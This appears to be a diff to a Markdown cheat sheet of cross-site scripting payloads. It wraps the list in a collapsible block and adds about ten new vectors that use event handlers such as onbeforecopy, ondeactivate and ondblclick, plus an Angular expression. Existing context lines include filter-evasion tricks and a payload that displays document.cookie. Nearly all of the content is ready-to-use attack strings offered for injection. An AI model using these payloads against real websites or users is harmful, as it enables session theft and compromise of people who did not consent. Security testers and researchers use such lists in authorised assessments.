@@ -29,6 +29,7 @@
 
 ## XSS Payloads <br>
 
+<details>
 ```txt
 <script>alert(document.domain+"\n\n"+document.cookie);<script>
 </script><svg><script/class=rodric>alert(1)</script>-%26apos;
@@ -159,7 +160,18 @@ xss><svg/onload=globalThis[`al`+/ert/.source]`1`//
 %E2%80%A8%E2%80%A9confirm(1)
 ;confirm(document.domain)//
 ;onerror=alert;throw%201
+<input autofocus ng-focus=”$event.path|orderBy:’[].constructor.from([1],alert)’”>
+<textarea onbeforecopy=alert(1) autofocus>XSS</textarea>
+<textarea onbeforecut=alert(1) autofocus>XSS</textarea>
+<textarea onbeforepaste=alert(1) autofocus></textarea>
+<tfoot id=x tabindex=1 onbeforedeactivate=alert(1)></tfoot><input autofocus>
+<tfoot id=x tabindex=1 ondeactivate=alert(1)></tfoot><input id=y autofocus>
+<th oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<th oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<th ondblclick="alert(1)" autofocus tabindex=1>test</th>
+<th onfocusout=alert(1) tabindex=1 id=x></th><input autofocus>
 ```
+</details>
 
 ## XSS + SSRF <br>
 
